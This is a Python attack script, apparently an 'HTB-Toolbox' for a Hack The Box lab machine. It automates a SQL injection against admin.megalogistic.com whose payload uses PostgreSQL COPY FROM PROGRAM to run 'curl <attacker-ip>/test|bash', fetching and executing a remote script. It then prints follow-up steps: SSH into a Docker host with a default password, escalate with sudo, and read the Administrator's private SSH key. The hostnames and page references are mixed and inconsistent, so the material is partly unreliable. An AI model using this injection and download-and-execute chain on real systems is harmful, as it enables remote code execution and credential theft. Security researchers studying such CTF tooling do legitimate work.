import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Toolbox
    __________________________________________________________________________\n"""
    print(Fore.BLUE + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] Docker", "[+] Administrator" , "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.236" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Toolbox Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
#------------------------------------------------------------------------

def conection_user_docker_user():
    url = "https://admin.megalogistic.com/"

    phpsseid=input("Enter your PHPSESSID > ")

    headers = {
        "Host": "admin.megalogistic.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://admin.megalogistic.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://admin.megalogistic.com",
        "Priority": "u=0, i",
        "Te": "trailers",
        "Connection": "keep-alive",
        "Cookie": f"PHPSESSID={phpsseid}"
    }

    payload = (
        f"username=';COPY+cmd_exec+FROM+PROGRAM+'curl+{machine_ip}/test|bash';--+-"
        "&password='"
    )

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=20, verify=False)
        print("Status Code:", response.status_code)
        print("Response Headers:", response.headers)
        print("Response Body Preview:\n", response.text[:1000])
    except requests.exceptions.RequestException as e:
        print("Request failed:", e)


def docker_root_and_id_rsa():
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-root-user Commad (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"ssh docker@172.17.0.1   > password: tcuser")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-root-user Commad (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"sudo su")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[docker-root-user Commad (Victim Machine)] > " + Fore.LIGHTMAGENTA_EX + f"cd /c/Users/Administrator/.ssh && cat id_rsa")


#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","Docker connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker-user Exploit (SSRF)] > " + Fore.LIGHTMAGENTA_EX + f"http://staging.love.htb/")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker-user Exploit (Malicious File)] > " + Fore.LIGHTMAGENTA_EX + f"http://{target_machine}/admin/voters_add.php")
                conection_user_docker_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Docker] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user Exploit (AlwaysInstallElevated)] > " + Fore.LIGHTMAGENTA_EX + f"https://hacktricks.boitatech.com.br/windows/windows-local-privilege-escalation#alwaysinstallelevated-1")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator] > " + Fore.YELLOW + f"(Exploit) http://{target_machine}");cm.sleep(0.2)
                docker_root_and_id_rsa()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
